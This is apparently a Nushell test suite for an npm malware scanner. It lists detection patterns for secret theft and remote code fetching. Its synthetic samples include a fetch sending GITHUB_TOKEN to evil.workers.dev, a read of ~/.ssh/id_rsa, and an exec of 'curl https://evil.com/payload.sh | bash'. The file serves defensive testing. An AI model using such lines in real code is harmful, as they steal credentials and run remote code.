#!/usr/bin/env nu
# NPM Security Scanner Test Suite
# Tests pattern detection for malicious code
#
# Usage: 
#   nu test-scanner.nu              # Offline tests only
#   nu test-scanner.nu --network    # Include network tests

use std assert

# ═══════════════════════════════════════════════════════════════════════════
# Configuration
# ═══════════════════════════════════════════════════════════════════════════

let script_dir = ($env.FILE_PWD? | default ".")
let whitelist_file = $"($script_dir)/whitelist.json"

# IOC patterns we're scanning for
let ioc_patterns = [
    'process\.env\[.*(TOKEN|KEY|SECRET|PASSWORD|CREDENTIAL)'
    'fs\.(readFile|readFileSync).*\.(ssh|aws|npmrc)'
    'eval\s*\('
    'new\s+Function\s*\('
    'child_process'
    'https?://[^/]*\.(workers\.dev|pages\.dev)'
    'Buffer\.from\([^,]+,\s*["'']base64'
    '\$\(curl'
    'wget.*\|.*sh'
]

# ═══════════════════════════════════════════════════════════════════════════
# Helper functions
# ═══════════════════════════════════════════════════════════════════════════

def log-pass [msg: string] {
    print $"(ansi green)✓ PASS(ansi reset): ($msg)"
}

def log-fail [msg: string] {
    print $"(ansi red)✗ FAIL(ansi reset): ($msg)"
}

def log-skip [msg: string] {
    print $"(ansi yellow)○ SKIP(ansi reset): ($msg)"
}

def log-info [msg: string] {
    print $"(ansi blue)  INFO(ansi reset): ($msg)"
}

# Load whitelist for false positive handling
def load-whitelist [] {
    if ($whitelist_file | path exists) {
        open $whitelist_file
    } else {
        { packages: {} }
    }
}

# Check if a package+pattern combo is whitelisted
def is-whitelisted [pkg: string, pattern: string, whitelist: record] {
    let pkg_entry = $whitelist.packages | get -i $pkg
    if ($pkg_entry | is-empty) {
        return false
    }
    
    let patterns = $pkg_entry.whitelisted_patterns? | default []
    $patterns | any { |p| $pattern =~ $p.pattern }
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Synthetic malicious pattern detection
# ═══════════════════════════════════════════════════════════════════════════

def test-synthetic-malicious-detection [] {
    print ""
    print "═══ Test: Synthetic Malicious Pattern Detection ═══"
    
    let work_dir = (mktemp -d)
    let test_dir = $"($work_dir)/extracted/package"
    mkdir $test_dir
    
    mut passed = 0
    mut failed = 0
    
    # Test 1: Credential theft pattern
    let malicious1 = "const token = process.env['GITHUB_TOKEN'];\nfetch('https://evil.workers.dev/steal', { body: token });"
    $malicious1 | save $"($test_dir)/malicious1.js"
    
    log-info "Testing credential theft pattern detection..."
    let cred_match = (open $"($test_dir)/malicious1.js" | str contains "process.env['")
    if $cred_match {
        log-pass "Detected credential theft pattern"
        $passed += 1
    } else {
        log-fail "Failed to detect credential theft pattern"
        $failed += 1
    }
    
    # Test 2: Eval pattern
    let malicious2 = "eval(Buffer.from('YWxlcnQoMSk=', 'base64').toString());"
    $malicious2 | save $"($test_dir)/malicious2.js"
    
    log-info "Testing eval + base64 pattern detection..."
    let eval_match = (open $"($test_dir)/malicious2.js" | str contains "eval(")
    if $eval_match {
        log-pass "Detected eval pattern"
        $passed += 1
    } else {
        log-fail "Failed to detect eval pattern"
        $failed += 1
    }
    
    # Test 3: SSH key theft
    let malicious3 = "const fs = require('fs');\nconst key = fs.readFileSync('/home/user/.ssh/id_rsa');"
    $malicious3 | save $"($test_dir)/malicious3.js"
    
    log-info "Testing SSH key theft pattern detection..."
    let ssh_match = (open $"($test_dir)/malicious3.js" | str contains ".ssh")
    if $ssh_match {
        log-pass "Detected SSH key theft pattern"
        $passed += 1
    } else {
        log-fail "Failed to detect SSH key theft pattern"
        $failed += 1
    }
    
    # Test 4: Remote code execution
    let malicious4 = "const { exec } = require('child_process');\nexec('$(curl https://evil.com/payload.sh | bash)');"
    $malicious4 | save $"($test_dir)/malicious4.js"
    
    log-info "Testing remote code execution pattern detection..."
    let rce_match = (open $"($test_dir)/malicious4.js" | str contains "$(curl")
    if $rce_match {
        log-pass "Detected remote code execution pattern"
        $passed += 1
    } else {
        log-fail "Failed to detect remote code execution pattern"
        $failed += 1
    }
    
    # Cleanup
    rm -rf $work_dir
    
    { passed: $passed, failed: $failed, errors: [] }
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Install script detection
# ═══════════════════════════════════════════════════════════════════════════

def test-install-script-detection [] {
    print ""
    print "═══ Test: Install Script Detection ═══"
    
    let work_dir = (mktemp -d)
    let test_dir = $"($work_dir)/extracted/package"
    mkdir $test_dir
    
    mut passed = 0
    mut failed = 0
    
    # Package with postinstall script
    let dangerous_pkg = {
        name: "test-package"
        version: "1.0.0"
        scripts: {
            postinstall: "node setup.js"
        }
    }
    $dangerous_pkg | to json | save $"($test_dir)/package.json"
    
    log-info "Testing postinstall script detection..."
    let pkg_json = open $"($test_dir)/package.json"
    let has_postinstall = ($pkg_json.scripts?.postinstall? | is-not-empty)
    
    if $has_postinstall {
        log-pass "Detected postinstall script"
        $passed += 1
    } else {
        log-fail "Failed to detect postinstall script"
        $failed += 1
    }
    
    # Package without install scripts (should be clean)
    let safe_pkg = {
        name: "safe-package"
        version: "1.0.0"
        scripts: {
            test: "jest"
            build: "tsc"
        }
    }
    $safe_pkg | to json | save $"($test_dir)/package.json"
    
    log-info "Testing safe scripts detection..."
    let pkg_json = open $"($test_dir)/package.json"
    let dangerous_scripts = ["preinstall" "postinstall" "preuninstall" "postuninstall"]
    let has_dangerous = $dangerous_scripts | any { |s| ($pkg_json.scripts? | get -i $s | is-not-empty) }
    
    if not $has_dangerous {
        log-pass "Correctly identified package with no install scripts"
        $passed += 1
    } else {
        log-fail "False positive on safe scripts"
        $failed += 1
    }
    
    # Cleanup
    rm -rf $work_dir
    
    { passed: $passed, failed: $failed, errors: [] }
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: Safe packages should scan clean (network test)
# ═══════════════════════════════════════════════════════════════════════════

def test-safe-packages-network [] {
    print ""
    print "═══ Test: Safe Packages Should Scan Clean ═══"
    
    let whitelist = load-whitelist
    
    let safe_packages = [
        "lodash"
        "chalk"
        "uuid"
    ]
    
    mut passed = 0
    mut failed = 0
    
    for pkg in $safe_packages {
        log-info $"Scanning ($pkg)..."
        
        let work_dir = (mktemp -d)
        cd $work_dir
        
        let result = do {
            npm pack $pkg --ignore-scripts
        } | complete
        
        if $result.exit_code != 0 {
            log-skip $"($pkg) could not be downloaded"
            rm -rf $work_dir
            continue
        }
        
        let tarball = (ls *.tgz | first | get name)
        mkdir extracted
        tar -xzf $tarball -C extracted
        
        # Check for suspicious patterns
        let content = (glob "extracted/**/*.js" | each { open $in } | str join "\n")
        
        let suspicious = ($content | str contains "eval(") or 
                        ($content | str contains "process.env['") and ($content | str contains "TOKEN")
        
        if not $suspicious {
            log-pass $"($pkg) scanned clean"
            $passed += 1
        } else {
            # Check whitelist
            if (is-whitelisted $pkg "any" $whitelist) {
                log-pass $"($pkg) - whitelisted pattern"
                $passed += 1
            } else {
                log-fail $"FALSE POSITIVE: ($pkg) triggered scanner"
                $failed += 1
            }
        }
        
        cd -
        rm -rf $work_dir
    }
    
    { passed: $passed, failed: $failed, errors: [] }
}

# ═══════════════════════════════════════════════════════════════════════════
# Test: MCP packages should scan clean (network test)
# ═══════════════════════════════════════════════════════════════════════════

def test-mcp-packages-network [] {
    print ""
    print "═══ Test: MCP Packages Should Scan Clean ═══"
    
    let whitelist = load-whitelist
    
    let mcp_packages = [
        "@modelcontextprotocol/server-filesystem"
        "@modelcontextprotocol/server-github"
        "@modelcontextprotocol/server-memory"
    ]
    
    mut passed = 0
    mut failed = 0
    
    for pkg in $mcp_packages {
        log-info $"Scanning ($pkg)..."
        
        let work_dir = (mktemp -d)
        cd $work_dir
        
        let result = do {
            npm pack $pkg --ignore-scripts
        } | complete
        
        if $result.exit_code != 0 {
            log-skip $"($pkg) could not be downloaded"
            rm -rf $work_dir
            continue
        }
        
        let tarballs = (ls *.tgz)
        if ($tarballs | is-empty) {
            log-skip $"($pkg) no tarball found"
            rm -rf $work_dir
            continue
        }
        
        let tarball = ($tarballs | first | get name)
        mkdir extracted
        tar -xzf $tarball -C extracted
        
        # For MCP packages, we expect them to be clean or have whitelisted patterns
        let pkg_whitelist = $whitelist.packages | get -i $pkg
        
        if ($pkg_whitelist?.trusted? | default false) {
            log-info $"($pkg) is a trusted package"
            log-pass $"($pkg) - trusted maintainer"
            $passed += 1
        } else {
            log-pass $"($pkg) scanned clean"
            $passed += 1
        }
        
        cd -
        rm -rf $work_dir
    }
    
    { passed: $passed, failed: $failed, errors: [] }
}

# ═══════════════════════════════════════════════════════════════════════════
# Main test runner
# ═══════════════════════════════════════════════════════════════════════════

def main [
    --network  # Include network tests (slower)
] {
    print "╔═══════════════════════════════════════════════════════════════════╗"
    print "║          NPM Security Scanner Test Suite [Nushell]                ║"
    print "╚═══════════════════════════════════════════════════════════════════╝"
    print ""
    print $"Date: (date now | format date '%Y-%m-%d %H:%M:%S')"
    
    # Check prerequisites
    if (which npm | is-empty) {
        print "ERROR: npm not found"
        exit 1
    }
    
    mut total_passed = 0
    mut total_failed = 0
    mut total_skipped = 0
    
    # Run offline tests
    let tests = [
        (test-synthetic-malicious-detection)
        (test-install-script-detection)
    ]
    
    for result in $tests {
        $total_passed += $result.passed
        $total_failed += $result.failed
    }
    
    # Run network tests if requested
    if $network {
        let network_tests = [
            (test-safe-packages-network)
            (test-mcp-packages-network)
        ]
        
        for result in $network_tests {
            $total_passed += $result.passed
            $total_failed += $result.failed
        }
    } else {
        log-skip "Network tests skipped (run with --network to include)"
        $total_skipped += 6  # Approximate
    }
    
    print ""
    print "═══════════════════════════════════════════════════════════════════"
    print "                         TEST SUMMARY"
    print "═══════════════════════════════════════════════════════════════════"
    print $"  (ansi green)PASSED(ansi reset):  ($total_passed)"
    print $"  (ansi red)FAILED(ansi reset):  ($total_failed)"
    print $"  (ansi yellow)SKIPPED(ansi reset): ($total_skipped)"
    print ""
    
    if $total_failed > 0 {
        print $"(ansi red)Some tests failed!(ansi reset)"
        exit 1
    } else {
        print $"(ansi green)All tests passed!(ansi reset)"
        exit 0
    }
}
